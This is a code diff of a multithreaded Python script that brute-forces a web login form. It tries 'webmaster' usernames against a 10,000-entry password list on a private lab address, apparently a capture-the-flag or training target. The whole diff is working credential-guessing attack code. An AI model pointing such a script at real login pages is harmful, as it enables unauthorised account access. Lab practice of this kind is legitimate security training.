@@ -1,18 +1,13 @@
 import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-USERNAME_FIELD = "username"
-PASSWORD_FIELD = "password"
-
-TARGET_URL = "http://192.168.56.102/index.php?page=signin&username={USERNAME_FIELD}&password={PASSWORD_FIELD}&Login=Login#"
+TARGET_URL = "http://192.168.56.102/index.php?page=signin"
 
 SUCCESS_KEYWORD = "flag"
-
 USERNAMES = ["webmaster", "Webmaster"]
-PASSWORD_FILE = "passwords.txt"
+PASSWORD_FILE = "10_million_password_list_top_10000.txt"
 
-THREADS = 50  # Number of threads to use
-
+THREADS = 20
 
 def load_passwords():
     """Load password list from file"""
@@ -26,14 +21,14 @@ def load_passwords():
 
 def try_login(username, password):
     """Attempt a single login request. Returns credentials if successful."""
-    
-    data = {
-        USERNAME_FIELD: username,
-        PASSWORD_FIELD: password
-    }
 
     try:
-        res = requests.post(TARGET_URL, data=data, timeout=5)
+        res = requests.post(TARGET_URL, params={
+			"page": "signin",
+			"username": username,
+			"password": password,
+			"Login": "Login"
+		})
     except:
         return None
 
